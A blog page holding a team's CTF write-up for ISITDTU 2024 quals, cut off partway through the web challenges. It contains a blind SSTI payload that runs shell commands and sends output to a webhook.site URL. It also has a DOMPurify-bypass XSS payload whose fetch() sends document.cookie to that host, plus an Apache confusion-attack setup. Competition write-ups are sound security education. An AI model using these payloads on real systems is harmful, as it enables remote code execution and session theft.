<!doctype html>
<html
  lang="en-us" 
  
    data-theme-mode="true"
  
>
  <head>
    
    <meta charset="utf-8" />
<meta
  name="viewport"
  content="width=device-width, initial-scale=1, shrink-to-fit=no"
/>







  

<title>
  Writeups ISITDTU 2024 (Quals) - ph1sher | Spid3r
</title>
<meta
  name="description"
  content="Writeups ISITDTU 2024 (Quals) - ph1sher"
/>



  <script>
  (function(c,l,a,r,i,t,y){
      c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};
      t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;
      y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);
  })(window, document, "clarity", "script", "true");
</script>


  
<script src="https://www.googletagmanager.com/gtag/js?id=true"></script>
<script data-pjax>
  window.dataLayer = window.dataLayer || [];

  function gtag() {
    dataLayer.push(arguments);
  }

  gtag('js', new Date());

  gtag('config', 'true');
</script>








<script>
  window.siteConfig = JSON.parse("{\"anchor_icon\":null,\"clipboard\":{\"copyright\":{\"content\":\"本文版权：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处！\",\"count\":50,\"enable\":false},\"fail\":\"error (ﾟ⊿ﾟ)ﾂ\",\"success\":\"copied(*^▽^*)\"},\"code_block\":{\"expand\":true},\"icon_font\":\"4552607_0khxww3tj3q9\",\"outdate\":{\"daysago\":180,\"enable\":false,\"message\":\"本文最后更新于 {time}，请注意文中内容可能已经发生变化。\"}}");
</script>

<script>
  window.siteConfig.swPath = '\/sw.js';
</script>











  
  
  
    
  

  
  
  
    
  

  
  
  
    
  

  
  
  


<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
<link
  rel="preload"
  as="style"
  href="https://fonts.googleapis.com/css?family=JetBrains%20Mono:400,400italic,700,700italic%7cMulish:400,400italic,700,700italic%7cNoto%20Serif%20SC:400,400italic,700,700italic%7cJetBrains%20Mono:400,400italic,700,700italic&amp;display=swap"
/>
<link
  rel="stylesheet"
  href="https://fonts.googleapis.com/css?family=JetBrains%20Mono:400,400italic,700,700italic%7cMulish:400,400italic,700,700italic%7cNoto%20Serif%20SC:400,400italic,700,700italic%7cJetBrains%20Mono:400,400italic,700,700italic&amp;display=swap"
  media="print"
  onload="this.media='all'"
/>






  <link
    rel="preload"
    href="//at.alicdn.com/t/c/font_4552607_0khxww3tj3q9.woff2"
    as="font"
    type="font/woff2"
    crossorigin="anonymous"
  />





  <meta property="og:type" content="website" />
  <meta property="og:title" content="Writeups ISITDTU 2024 (Quals) - ph1sher | Spid3r" />
  <meta
    property="og:description"
    content="Writeups ISITDTU 2024 (Quals) - ph1sher"
  />
  <meta property="og:url" content="https://sondt1337.github.io/post/isitdtu_ph1sher_quals/" />
  <meta
    property="og:site_name"
    content="Adventures of Spid3r"
  />
  <meta
    property="og:image"
    content="/images/isitdtu_ph1sher_quals/featured.png"
  />
  <meta property="article:author" content="Spid3r" />
  <meta property="article:published_time" content="2024-10-27T11:00:00-07:00" />
  <meta property="article:modified_time" content="2024-10-27T11:00:00-07:00" />
  
  
  <meta name="twitter:card" content="summary" />
  <meta name="twitter:image" content="/images/isitdtu_ph1sher_quals/featured.png" />
  
  
  
  
  




<link rel="shortcut icon" href="/favicon.ico">








  
 <link rel="stylesheet" href="/css/main.min.a6d178773947d1c76596c54c2443acf75cd46e3b9a6f1c7c7f04a9498cb763bf.css" />





  <link
    rel="preload"
    as="style"
    href="https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.css"
    onload="this.onload=null;this.rel='stylesheet'"
  />






  <link
    rel="preload"
    as="style"
    href="https://npm.webcache.cn/katex@0.16.9/dist/katex.min.css"
    onload="this.onload=null;this.rel='stylesheet'"
  />








  

  
  
  
  
  
  
  <script
    src="https://npm.webcache.cn/pace-js@1.2.4/pace.min.js"
    
    
    
    
    integrity="sha384-k6YtvFUEIuEFBdrLKJ3YAUbBki333tj1CSUisai5Cswsg9wcLNaPzsTHDswp4Az8" crossorigin="anonymous"
  ></script>





  


  <link rel="stylesheet" href="https://npm.webcache.cn/@reimujs/aos@0.1.0/dist/aos.css" />








  <link rel="stylesheet" href="https://npm.webcache.cn/aplayer@1.10.1/dist/APlayer.min.css" />



    
  </head>
  <body>
    
    

<div id="copy-tooltip" style="pointer-events: none; opacity: 0; transition: all 0.2s ease; position: fixed;top: 50%;left: 50%;z-index: 999;transform: translate(-50%, -50%);color: white;background: rgba(0, 0, 0, 0.5);padding: 10px 15px;border-radius: 10px;">
</div>


  <div class="notification-wrapper">
    <h1>New version found</h1>
    <p>The website seems to have new content, do you want to update?</p>
    <div class="notification-btn">
      <button id="notification-update-btn">Update</button>
      <button id="notification-close-btn">Cancel</button>
    </div>
  </div>

    <div id="container">
      <div id="wrap">
        
<div id="header-nav">
  <nav id="main-nav">
    
      <span class="main-nav-link-wrap">
        <div class='main-nav-icon icon '>
          
            &#xe632;
          
        </div>
        <a class="main-nav-link" href="/">Home</a>
      </span>
    
      <span class="main-nav-link-wrap">
        <div class='main-nav-icon icon '>
          
            &#xe604;
          
        </div>
        <a class="main-nav-link" href="/archives">Archives</a>
      </span>
    
      <span class="main-nav-link-wrap">
        <div class='main-nav-icon icon '>
          
            &#xe628;
          
        </div>
        <a class="main-nav-link" href="/about">About</a>
      </span>
    
      <span class="main-nav-link-wrap">
        <div class='main-nav-icon icon '>
          
            &#xe621;
          
        </div>
        <a class="main-nav-link" href="/achievements">Achievements</a>
      </span>
    
    <a id="main-nav-toggle" class="nav-icon"></a>
  </nav>
  <nav id="sub-nav">
    
    
      <a id="nav-search-btn" class="nav-icon popup-trigger" title="Search"></a>
    
  </nav>
</div>
<header id="header">
  
    <picture></picture>
    <img fetchpriority="high" src="/images/isitdtu_ph1sher_quals/featured.png" alt="Writeups ISITDTU 2024 (Quals) - ph1sher">
  

  <div id="header-outer">
    <div id="header-title">
      
        
        
          
        
  
        
          <a href="/" id="logo">
            <h1 data-aos="slide-up">Writeups ISITDTU 2024 (Quals) - ph1sher</h1>
          </a>
        
      
  
      
        
        
        <h2 id="subtitle-wrap" data-aos="slide-down">
          
        </h2>
      
    </div>
  </div>
</header>
        <div id="content"
          
          class="sidebar-right"  >
          <aside id="sidebar">
  
  
    <div id="aplayer" theme="var(--color-link)" data-aos="fade-up"></div>
  
  
  <div class="sidebar-wrapper wrap-sticky">
    <div
      class="sidebar-wrap"
      data-aos="fade-up"
    >
      
        
          <div class="sidebar-toc-sidebar">
            <div class="sidebar-toc">
  <h3 class="toc-title">Contents</h3>
  <div class="sidebar-toc-wrapper toc-div-class">
    <nav id="TableOfContents">
  <ul>
    <li><a href="#web">Web</a>
      <ul>
        <li><a href="#another-one">Another one</a></li>
        <li><a href="#x-éc-éc">X Éc Éc</a></li>
        <li><a href="#s1mple">S1mple</a></li>
        <li><a href="#hihi">hihi</a></li>
        <li><a href="#niceray">niceray</a></li>
      </ul>
    </li>
    <li><a href="#osint">Osint</a>
      <ul>
        <li><a href="#sparks">Sparks</a></li>
        <li><a href="#home-sweet-home">Home sweet home</a></li>
      </ul>
    </li>
    <li><a href="#reverse-engineering">Reverse Engineering</a>
      <ul>
        <li><a href="#re01">re01</a></li>
        <li><a href="#animal">animal</a></li>
        <li><a href="#re02">re02</a></li>
        <li><a href="#the-chamber-of-flag">The Chamber of Flag</a></li>
      </ul>
    </li>
    <li><a href="#cryptography">Cryptography</a>
      <ul>
        <li><a href="#sharemixer1">ShareMixer1</a></li>
        <li><a href="#sharemixer2">ShareMixer2</a></li>
      </ul>
    </li>
    <li><a href="#forensics">Forensics</a>
      <ul>
        <li><a href="#cpusage">CPUsage</a></li>
        <li><a href="#corrupted-hard-drive">Corrupted Hard Drive</a></li>
        <li><a href="#initial">Initial</a></li>
      </ul>
    </li>
    <li><a href="#pwn">PWN</a>
      <ul>
        <li><a href="#shellcode-1">shellcode 1</a></li>
        <li><a href="#shellcode-2">shellcode 2</a></li>
        <li><a href="#game-of-luck">Game of Luck</a></li>
        <li><a href="#no_name">no_name</a></li>
      </ul>
    </li>
    <li><a href="#misc">MISC</a>
      <ul>
        <li><a href="#welcome">Welcome</a></li>
      </ul>
    </li>
  </ul>
</nav>
  </div>
</div>
          </div>
          <div class="sidebar-common-sidebar hidden">
            
<div class="sidebar-author">
  <img
    data-src="/avatar/../images/avatar.jpg"
    data-sizes="auto"
    alt="Spid3r"
    class="lazyload"
  />
  <div class="sidebar-author-name">Spid3r</div>
  <div class="sidebar-description">I&#39;m a little spider</div>
</div>
<div class="sidebar-state">
  <div class="sidebar-state-article">
    <div>Posts</div>
    
    <div class="sidebar-state-number">11</div>
  </div>
  <div class="sidebar-state-category">
    <div>Categories</div>
    <div class="sidebar-state-number">
      0
    </div>
  </div>
  <div class="sidebar-state-tag">
    <div>Tags</div>
    <div class="sidebar-state-number">5</div>
  </div>
</div>
<div class="sidebar-social">
  
</div>
<div class="sidebar-menu">
  
    <div class="sidebar-menu-link-wrap">
      <a
        class="sidebar-menu-link-dummy"
        href="/"
        aria-label="Home"
      ></a>
      <div class='sidebar-menu-icon icon '>
        
          &#xe632;
        
      </div>
      <div class="sidebar-menu-link">Home</div>
    </div>
  
    <div class="sidebar-menu-link-wrap">
      <a
        class="sidebar-menu-link-dummy"
        href="/archives"
        aria-label="Archives"
      ></a>
      <div class='sidebar-menu-icon icon '>
        
          &#xe604;
        
      </div>
      <div class="sidebar-menu-link">Archives</div>
    </div>
  
    <div class="sidebar-menu-link-wrap">
      <a
        class="sidebar-menu-link-dummy"
        href="/about"
        aria-label="About"
      ></a>
      <div class='sidebar-menu-icon icon '>
        
          &#xe628;
        
      </div>
      <div class="sidebar-menu-link">About</div>
    </div>
  
    <div class="sidebar-menu-link-wrap">
      <a
        class="sidebar-menu-link-dummy"
        href="/achievements"
        aria-label="Achievements"
      ></a>
      <div class='sidebar-menu-icon icon '>
        
          &#xe621;
        
      </div>
      <div class="sidebar-menu-link">Achievements</div>
    </div>
  
</div>

          </div>
        
      

      
        
          <div class="sidebar-btn-wrapper" style="position:static">
            <div class="sidebar-toc-btn current"></div>
            <div class="sidebar-common-btn"></div>
          </div>
        
      
    </div>
  </div>

  <div class="sidebar-widget">
    
  </div>
  
</aside>

          <section id="main">
  <article
  class="h-entry article"
  itemprop="blogPost"
  itemscope
  itemtype="https://schema.org/BlogPosting"
>
  <div
    class="article-inner"
    data-aos="fade-up"
  >
    <div class="article-meta">
      <div class="article-date">
  <span
    class="article-date-link"
    data-aos="zoom-in"
  >
    <time datetime="2024-10-27 11:00:00 -0700 -0700" itemprop="datePublished"
      >2024-10-27</time
    >
    <time style="display: none;" id="post-update-time"
      >2024-10-27</time
    >
  </span>
</div>

      <div class="article-category">
  
</div>

    </div>
    <div class="hr-line"></div>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
      
        <h1 id="writeups-isitdtu-2024-quals---ph1sher">
<a class="header-anchor" href="#writeups-isitdtu-2024-quals---ph1sher"></a>
Writeups ISITDTU 2024 (Quals) - ph1sher
</h1><p>We participated in the ISITDTU CTF 2024 competition, finishing in 15th place out of 315 teams with 21 challenges successfully solved.</p>
<blockquote>
<p>&ldquo;Everything is working fine, except for the crypto guys&rdquo; - Quote by sondt</p></blockquote>
<p><img src="https://hackmd.io/_uploads/SJq-djie1e.png" alt="image"></p>
<h2 id="web">
<a class="header-anchor" href="#web"></a>
Web
</h2><h3 id="another-one">
<a class="header-anchor" href="#another-one"></a>
Another one
</h3><p><img src="https://hackmd.io/_uploads/B11n6cjxkg.png" alt="image"></p>
<p>Review the src code</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/register&#39;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;POST&#39;</span><span class="p">])</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">register</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="n">json_data</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">data</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="s2">&#34;admin&#34;</span> <span class="ow">in</span> <span class="n">json_data</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">jsonify</span><span class="p">(</span><span class="n">message</span><span class="o">=</span><span class="s2">&#34;Blocked!&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">data</span> <span class="o">=</span> <span class="n">ujson</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">json_data</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">username</span> <span class="o">=</span> <span class="n">data</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;username&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">password</span> <span class="o">=</span> <span class="n">data</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;password&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">role</span> <span class="o">=</span> <span class="n">data</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;role&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">role</span> <span class="o">!=</span><span class="s2">&#34;admin&#34;</span> <span class="ow">and</span> <span class="n">role</span> <span class="o">!=</span> <span class="s2">&#34;user&#34;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">jsonify</span><span class="p">(</span><span class="n">message</span><span class="o">=</span><span class="s2">&#34;Never heard about that role!&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">username</span> <span class="o">==</span> <span class="s2">&#34;&#34;</span> <span class="ow">or</span> <span class="n">password</span> <span class="o">==</span> <span class="s2">&#34;&#34;</span> <span class="ow">or</span> <span class="n">role</span> <span class="o">==</span> <span class="s2">&#34;&#34;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">jsonify</span><span class="p">(</span><span class="n">messaage</span><span class="o">=</span><span class="s2">&#34;Lack of input&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">register_db</span><span class="p">(</span><span class="n">connection</span><span class="p">,</span> <span class="n">username</span><span class="p">,</span> <span class="n">password</span><span class="p">,</span> <span class="n">role</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">jsonify</span><span class="p">(</span><span class="n">message</span><span class="o">=</span><span class="s2">&#34;User registered successfully.&#34;</span><span class="p">),</span> <span class="mi">201</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">jsonify</span><span class="p">(</span><span class="n">message</span><span class="o">=</span><span class="s2">&#34;Registration failed!&#34;</span><span class="p">),</span> <span class="mi">400</span>
</span></span></code></pre></div><ul>
<li>The <code>/register</code> endpoint blocks any registration attempts that include the string &ldquo;admin&rdquo; in the raw JSON data (json_data).</li>
<li>However, after this check, it uses ujson.loads(json_data) to parse the JSON.</li>
<li>This means if we can encode &ldquo;admin&rdquo; in a way that it&rsquo;s not directly in json_data, we can bypass the check.</li>
</ul>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="p">{</span><span class="nt">&#34;username&#34;</span><span class="p">:</span><span class="s2">&#34;a&#34;</span><span class="p">,</span><span class="nt">&#34;password&#34;</span><span class="p">:</span><span class="s2">&#34;a&#34;</span><span class="p">,</span><span class="nt">&#34;role&#34;</span><span class="p">:</span> <span class="s2">&#34;\u0061\u0064\u006d\u0069\u006e&#34;</span><span class="p">}</span>
</span></span></code></pre></div><p><img src="https://hackmd.io/_uploads/HJ2uC9slke.png" alt="image"></p>
<p>Login with this account to obtain JWT Token</p>
<p><img src="https://hackmd.io/_uploads/H1tn09oe1g.png" alt="image"></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/render&#39;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;POST&#39;</span><span class="p">])</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">dynamic_template</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="n">token</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">cookies</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;jwt_token&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">token</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">decoded</span> <span class="o">=</span> <span class="n">jwt</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="n">token</span><span class="p">,</span> <span class="n">app</span><span class="o">.</span><span class="n">config</span><span class="p">[</span><span class="s1">&#39;SECRET_KEY&#39;</span><span class="p">],</span> <span class="n">algorithms</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;HS256&#39;</span><span class="p">])</span>
</span></span><span class="line"><span class="cl">            <span class="n">role</span> <span class="o">=</span> <span class="n">decoded</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;role&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">role</span> <span class="o">!=</span> <span class="s2">&#34;admin&#34;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="n">jsonify</span><span class="p">(</span><span class="n">message</span><span class="o">=</span><span class="s2">&#34;Admin only&#34;</span><span class="p">),</span> <span class="mi">403</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">            <span class="n">data</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">get_json</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">            <span class="n">template</span> <span class="o">=</span> <span class="n">data</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&#34;template&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="n">rendered_template</span> <span class="o">=</span> <span class="n">render_template_string</span><span class="p">(</span><span class="n">template</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="n">jsonify</span><span class="p">(</span><span class="n">message</span><span class="o">=</span><span class="s2">&#34;Done&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">except</span> <span class="n">jwt</span><span class="o">.</span><span class="n">ExpiredSignatureError</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="n">jsonify</span><span class="p">(</span><span class="n">message</span><span class="o">=</span><span class="s2">&#34;Token has expired.&#34;</span><span class="p">),</span> <span class="mi">401</span>
</span></span><span class="line"><span class="cl">        <span class="k">except</span> <span class="n">jwt</span><span class="o">.</span><span class="n">InvalidTokenError</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="n">jsonify</span><span class="p">(</span><span class="n">message</span><span class="o">=</span><span class="s2">&#34;Invalid JWT.&#34;</span><span class="p">),</span> <span class="mi">401</span>
</span></span><span class="line"><span class="cl">        <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="n">jsonify</span><span class="p">(</span><span class="n">message</span><span class="o">=</span><span class="nb">str</span><span class="p">(</span><span class="n">e</span><span class="p">)),</span> <span class="mi">500</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">jsonify</span><span class="p">(</span><span class="n">message</span><span class="o">=</span><span class="s2">&#34;Where is your token?&#34;</span><span class="p">),</span> <span class="mi">401</span>
</span></span></code></pre></div><ul>
<li>The /render endpoint is accessible only to users with the role &ldquo;admin&rdquo;.</li>
<li>It accepts a template parameter and uses render_template_string(template) to render it.</li>
<li>The rendered output isn&rsquo;t directly returned, but exceptions (errors) include messages that can be manipulated.</li>
</ul>
<p>=&gt; Blind SSTI =&gt; To view the command output we can create a webhook and send that to this endpoint</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">{
</span></span><span class="line"><span class="cl">  &#34;template&#34;: &#34;{{ url_for.__globals__[&#39;__builtins__&#39;][&#39;__import__&#39;](&#39;urllib2&#39;).urlopen(&#39;https://webhook.site/0139531b-9559-42d0-a71a-b43e039822c2/?flag=&#39; + url_for.__globals__[&#39;os&#39;].popen(&#39;ls&#39;).read()) }}&#34;
</span></span><span class="line"><span class="cl">}
</span></span></code></pre></div><p><img src="https://hackmd.io/_uploads/BJ0d1iieyl.png" alt="image"></p>
<p>The payload running the <code>ls</code> command returns an error because the output contains control characters -&gt; we can see the name of the flag file is <code>gnp6kw338gg6</code></p>
<p>Now simply run the command <code>cat gnp6kw338gg6</code></p>
<p><img src="https://hackmd.io/_uploads/H10Fbiilye.png" alt="image"></p>
<p><img src="https://hackmd.io/_uploads/HkK5xsig1g.png" alt="image"></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">ISITDTU{N0W_y0u_kn0w_h0w_T0_m4k3_1t_r3Fl3ct3d!!}
</span></span></code></pre></div><h3 id="x-éc-éc">
<a class="header-anchor" href="#x-%c3%a9c-%c3%a9c"></a>
X Éc Éc
</h3><p><img src="https://hackmd.io/_uploads/S15h6cigkx.png" alt="image"></p>
<p>The version used is DOMPurify 3.1.6., in this tweet <a href="https://x.com/kinugawamasato/status/1843687909431582830">https://x.com/kinugawamasato/status/1843687909431582830</a> the payload has been fixed in DOMPurify version 3.1.7.</p>
<p>=&gt; This is most likely the solution payload</p>
<p>Tried and successfully triggered XSS
<img src="https://hackmd.io/_uploads/rJhSZojgkg.png" alt="image"></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;svg&gt;&lt;a&gt;&lt;foreignobject&gt;&lt;a&gt;&lt;table&gt;&lt;a&gt;&lt;/table&gt;&lt;style&gt;&lt;!--&lt;/style&gt;&lt;/svg&gt;&lt;a id=&#34;-&gt;&lt;img src onerror=alert(document.domain)&gt;&#34;&gt;
</span></span></code></pre></div><p>Upgraded payload a bit for easier use</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="o">&lt;</span><span class="n">svg</span><span class="o">&gt;&lt;</span><span class="n">a</span><span class="o">&gt;&lt;</span><span class="n">foreignobject</span><span class="o">&gt;&lt;</span><span class="n">a</span><span class="o">&gt;&lt;</span><span class="n">table</span><span class="o">&gt;&lt;</span><span class="n">a</span><span class="o">&gt;&lt;/</span><span class="n">table</span><span class="o">&gt;&lt;</span><span class="n">style</span><span class="o">&gt;&lt;!--&lt;/</span><span class="n">style</span><span class="o">&gt;&lt;/</span><span class="n">svg</span><span class="o">&gt;&lt;</span><span class="n">a</span> <span class="n">id</span><span class="o">=</span><span class="s2">&#34;-&gt;&lt;img src onerror=eval(atob(&#39;base 64 payload&#39;))&gt;&#34;</span><span class="o">&gt;</span>
</span></span></code></pre></div><p>And encode base64 this js script</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="nx">fetch</span><span class="p">(</span><span class="s1">&#39;https://webhook.site/0139531b-9559-42d0-a71a-b43e039822c2?cookie=&#39;</span> <span class="o">+</span> <span class="nb">encodeURIComponent</span><span class="p">(</span><span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="p">))</span>
</span></span></code></pre></div><p>Save note and submit link for bot -&gt; get the flag</p>
<p><img src="https://hackmd.io/_uploads/Sy6rGjig1l.png" alt="image"></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">ISITDTU{d364c13b91d3bd0ecb3ffed49b229fc06b1208e8}
</span></span></code></pre></div><h3 id="s1mple">
<a class="header-anchor" href="#s1mple"></a>
S1mple
</h3><p><img src="https://hackmd.io/_uploads/rJSk0qig1e.png" alt="image"></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-dockerfile" data-lang="dockerfile"><span class="line"><span class="cl"><span class="k">FROM</span><span class="s"> servertest2008/simplehttpserver:1.4</span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="k">EXPOSE</span><span class="s"> 80</span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="k">RUN</span> <span class="nb">echo</span> <span class="s2">&#34;flag_here&#34;</span> &gt; /.htpasswd<span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="k">CMD</span> <span class="p">[</span><span class="s2">&#34;/bin/bash&#34;</span><span class="p">,</span> <span class="s2">&#34;/start.sh&#34;</span><span class="p">]</span><span class="err">
</span></span></span></code></pre></div><p>In docker image there are echo fake flag commands. This could be a hint of Confusion Attacks in apache</p>
<p><img src="https://hackmd.io/_uploads/SyhyKoieye.png" alt="image"></p>
<p>Read more here: <a href="https://blog.orange.tw/posts/2024-08-confusion-attacks-en/">https://blog.orange.tw/posts/2024-08-confusion-attacks-en/</a></p>
<p>RewriteRule Flags used</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="o">&lt;</span><span class="n">VirtualHost</span> <span class="o">*</span><span class="p">:</span><span class="mi">80</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="n">DocumentRoot</span> <span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">html</span><span class="o">/</span><span class="n">src</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="o">&lt;</span><span class="n">FilesMatch</span> <span class="s2">&#34;\.php$&#34;</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="n">SetHandler</span>  <span class="s2">&#34;proxy:unix:/run/php/php7.0-fpm.sock|fcgi://localhost/&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="o">&lt;/</span><span class="n">FilesMatch</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="o">&lt;</span><span class="n">Proxy</span> <span class="s2">&#34;fcgi://localhost/&#34;</span> <span class="n">enablereuse</span><span class="o">=</span><span class="n">on</span> <span class="nb">max</span><span class="o">=</span><span class="mi">10</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="o">&lt;/</span><span class="n">Proxy</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="o">&lt;</span><span class="ne">Directory</span> <span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">html</span><span class="o">/</span><span class="n">src</span><span class="o">/&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="n">Options</span> <span class="n">FollowSymLinks</span>
</span></span><span class="line"><span class="cl">        <span class="n">AllowOverride</span> <span class="n">All</span>
</span></span><span class="line"><span class="cl">    <span class="o">&lt;/</span><span class="ne">Directory</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">RewriteEngine</span> <span class="n">On</span>
</span></span><span class="line"><span class="cl">    <span class="n">RewriteRule</span>  <span class="o">^/</span><span class="n">website</span><span class="o">-</span><span class="p">(</span><span class="o">.*</span><span class="p">)</span><span class="o">.</span><span class="n">doc</span><span class="o">$</span>   <span class="o">/$</span><span class="mf">1.</span><span class="n">html</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">RewriteCond</span> <span class="o">%</span><span class="p">{</span><span class="n">REQUEST_METHOD</span><span class="p">}</span> <span class="n">OPTIONS</span>
</span></span><span class="line"><span class="cl">    <span class="n">RewriteRule</span> <span class="o">^</span><span class="p">(</span><span class="o">.*</span><span class="p">)</span><span class="o">$</span> <span class="o">$</span><span class="mi">1</span> <span class="p">[</span><span class="n">R</span><span class="o">=</span><span class="mi">200</span><span class="p">,</span><span class="n">L</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">ErrorLog</span> <span class="o">$</span><span class="p">{</span><span class="n">APACHE_LOG_DIR</span><span class="p">}</span><span class="o">/</span><span class="n">error_php</span><span class="o">.</span><span class="n">log</span>
</span></span><span class="line"><span class="cl">    <span class="n">CustomLog</span> <span class="o">$</span><span class="p">{</span><span class="n">APACHE_LOG_DIR</span><span class="p">}</span><span class="o">/</span><span class="n">access_php</span><span class="o">.</span><span class="n">log</span> <span class="n">combined</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">&lt;/</span><span class="n">VirtualHost</span><span class="o">&gt;</span>
</span></span></code></pre></div><p>Investigate the provided Docker image. Realize that the root user has been acting suspiciously</p>
